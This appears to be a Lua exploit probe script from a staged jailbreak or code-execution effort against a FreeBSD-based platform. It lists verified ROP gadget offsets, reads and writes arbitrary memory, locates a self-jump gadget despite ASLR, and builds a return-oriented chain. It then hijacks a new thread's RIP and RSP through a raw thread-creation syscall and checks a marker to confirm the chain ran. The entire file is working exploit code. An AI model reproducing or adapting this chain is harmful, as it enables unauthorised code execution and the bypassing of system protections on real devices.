-- CRASH_CLASS: LOW
-- PROBE 531v: Stage 1 chain test — pop rax + pop rdi + store + park
--
-- All gadgets verified by 531u:
--   pop_rax_ret(+0x992) = 58 C3 ✓
--   pop_rdi_ret(+0xC9DFE) = 5F C3 ✓
--   pop_rsi_ret(+0xD77D) = 5E C3 ✓
--   pop_rdx_ret(+0x3B02D7) = 5A C3 ✓
--   pop_rcx_ret(+0xE64) = 59 C3 ✓
--   mov_rdi_rax_ret(+0x92C67) = 48 89 07 C3 ✓
-- jmp_self found at +0x15481 (531p scan)

print("=== PROBE 531v: CHAIN S1 ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end
local function zero(b, n) for off = 0, n-4, 4 do wd(b+off, 0) end end

local sc_mmap = make_syscall(477)
local sc_430 = make_syscall(430)
local sc_nanosleep = make_syscall(240)
local sc_thr_kill = make_syscall(433)

local ok_p, pid_v = pcall(function() return make_syscall(20)() end)
print("pid=" .. q(pid_v))

local info = memory.alloc(0x200)
zero(info, 0x200); wd(info, 0x160)
pcall(function() make_syscall(593)(uint64(0), info) end)
local eb_lo = rd(info + 0x108) or 0
local eb_hi = rd(info + 0x10C) or 0
local eboot = uint64(string.format("0x%X%08X", eb_hi or 0, eb_lo or 0))
print("eb=" .. q(eboot))

-- Verified gadgets
local pop_rax_ret = eboot + uint64(0x992)
local pop_rdi_ret = eboot + uint64(0xC9DFE)
local mov_rdi_rax_ret = eboot + uint64(0x92C67)
local jmp_self = eboot + uint64(0x15481)

-- Verify jmp_self bytes (should be EB FE)
local jmp_b = rd(eboot + 0x15481)
if jmp_b then
    local jn = jmp_b; if jn < 0 then jn = jn + 0x100000000 end
    local lo2 = jn % 0x10000
    print(string.format("jmp_self bytes: 0x%04X (expect 0xFEEB)", lo2))
    if lo2 ~= 0xFEEB then
        -- Not jmp$ at this offset with this ASLR. Scan briefly.
        print("  Scanning for EB FE...")
        jmp_self = nil
        for off = 0, 0x20000, 4 do
            local v = rd(eboot + off)
            if v then
                local vn = v; if vn < 0 then vn = vn + 0x100000000 end
                if (vn % 0x10000) == 0xFEEB then
                    jmp_self = eboot + uint64(off)
                    print(string.format("  found @+0x%X", off))
                    break
                end
                if math.floor(vn/0x100) % 0x10000 == 0xFEEB then
                    jmp_self = eboot + uint64(off+1)
                    print(string.format("  found @+0x%X", off+1))
                    break
                end
            end
        end
        if not jmp_self then print("ABORT: no jmp$") return end
    end
end

-- Alloc shared + stack
local ok_s, shared = pcall(function()
    return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
zero(shared, 0x4000)

local ok_st, stack_base = pcall(function()
    return sc_mmap(uint64(0), uint64(0x40000), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
end)
print("shared=" .. q(shared) .. " stack=" .. q(stack_base))

-- Build chain at top of stack
local chain = stack_base + 0x40000 - 0x200
local i = 0
local function emit(v) wq(chain + i, v); i = i + 8 end

-- pop rax → marker value
emit(uint64("0xCAFE1234ABCD"))
-- pop rdi → &shared
emit(pop_rdi_ret)
emit(shared)
-- mov [rdi], rax; ret
emit(mov_rdi_rax_ret)
-- park
emit(jmp_self)

print(string.format("chain=0x%X (%d bytes)", to_num(chain), i))

-- Context
local ctx = memory.alloc(0x500)
zero(ctx, 0x500)
wq(ctx + 0x108, uint64(0x480))
wd(ctx + 0x0D0, 0)
wq(ctx + 0x110, uint64(0x10000))
wq(ctx + 0x0C0, uint64(0x43))
wq(ctx + 0x100, uint64(0x3B))
wq(ctx + 0x0F0, uint64(0x202))
wq(ctx + 0x0E0, pop_rax_ret)   -- RIP = chain start
wq(ctx + 0x0F8, chain)          -- RSP = chain[0]

-- Spawn
print("[thr_create]")
local tid_buf = memory.alloc(8)
wq(tid_buf, uint64(0))
local ok_tc, rv_tc = pcall(function()
    return sc_430(uint64(ctx), uint64(tid_buf), uint64(0))
end)
print("  rv=" .. tostring(to_num(rv_tc)) .. " tid=" .. q(rq(tid_buf)))

-- Wait 300ms
local ts = memory.alloc(16)
wq(ts, 0); wq(ts + 8, 300000000)
pcall(function() sc_nanosleep(uint64(ts), uint64(0)) end)

-- Check
local marker = rq(shared)
print("  marker=" .. q(marker))
if marker and to_num(marker) ~= 0 then
    print("  S1 SUCCESS — ROP chain executed!")
else
    print("  S1 FAILED")
end

-- thr_kill check
local ok_k, rv_k = pcall(function() return sc_thr_kill(rq(tid_buf), uint64(0)) end)
print("  thr_kill=" .. tostring(to_num(rv_k)))

print("=== 531v DONE ===")
